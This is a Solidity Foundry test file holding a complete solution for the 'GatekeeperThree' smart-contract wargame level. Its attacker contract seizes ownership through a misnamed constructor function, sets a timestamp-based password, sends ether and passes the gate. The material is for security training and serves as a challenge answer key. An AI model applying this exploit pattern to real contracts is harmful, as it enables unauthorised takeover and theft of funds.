pragma solidity ^0.8.0;

import "src/levels/GatekeeperThree/GatekeeperThreeFactory.sol";
import "src/levels/GatekeeperThree/GatekeeperThree.sol";
import "forge-std/Test.sol";

contract GatekeeperThreeAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    GatekeeperThreeFactory public factory;
    GatekeeperThree public instance;

    function setUp() public {
        factory = new GatekeeperThreeFactory();
        instance = GatekeeperThree(payable(factory.createInstance(dummyPlayerAddress)));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        payable(dummyPlayerAddress).transfer(0.0011 ether);
        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);

        // Deploy new attacker contract
        GatekeeperThreeAttack attacker = (new GatekeeperThreeAttack){value: 0.0011 ether}(payable(address(instance)));

        // Trigger attack
        attacker.attack();
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}

contract GatekeeperThreeAttack {
    GatekeeperThree public gatekeeperThree;

    constructor(address payable _gatekeeperThree) payable {
        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
    }

    function attack() public {
        // Take ownership
        gatekeeperThree.construct0r();
        // Set pasword block.timmestamp
        gatekeeperThree.createTrick();
        // Set allow_entrance = true
        gatekeeperThree.getAllowance(block.timestamp);
        // Enter
        payable(address(gatekeeperThree)).transfer(0.0011 ether);
        gatekeeperThree.enter();
    }
}
